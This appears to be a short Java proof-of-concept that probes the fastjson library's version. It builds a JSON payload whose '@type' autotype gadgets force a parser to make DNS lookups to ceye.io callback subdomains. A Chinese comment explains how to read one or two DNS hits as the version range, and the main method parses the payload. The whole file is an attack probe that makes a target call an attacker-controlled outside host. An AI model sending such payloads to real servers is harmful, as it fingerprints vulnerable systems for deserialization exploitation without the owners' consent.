import com.alibaba.fastjson.JSON;

public class DnsDetectVersion
{
	/*
    	如果收到了两个 dns 请求，则证明使用了 1.2.83+ 版本
    	如果收到了一个 dns 请求，则证明使用了 1.2.80- 版本
	 */
	private static String poc1 = "" +
		"{\n" +
		"\t\"a\":{\n" +
		"\t\t\"@type\":\"java.lang.Exception\",\n" +
		"\t\t\"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
		"\t\t\"x\":{\n" +
		"\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\n" +
		"\t\t\t\t\"address\":,\"val\":\"fist.1.218bqo.ceye.io\"\n" +
		"\t\t\t}\n" +
		"\t\t}\n" +
		"\t},\n" +
		"\t\"b\":{\n" +
		"\t\t\"@type\":\"java.lang.Exception\",\n" +
		"\t\t\"@type\":\"com.alibaba.fastjson.JSONException\",\n" +
		"\t\t\"message\":{\n" +
		"\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\n" +
		"\t\t\t\t\"address\":,\"val\":\"second.2.218bqo.ceye.io\"\n" +
		"\t\t\t}\n" +
		"\t\t}\n" +
		"\t}\n" +
		"}";


	public static void main( String[] args ) {
		System.out.println(poc1);

		JSON.parseObject(poc1);
	}
}
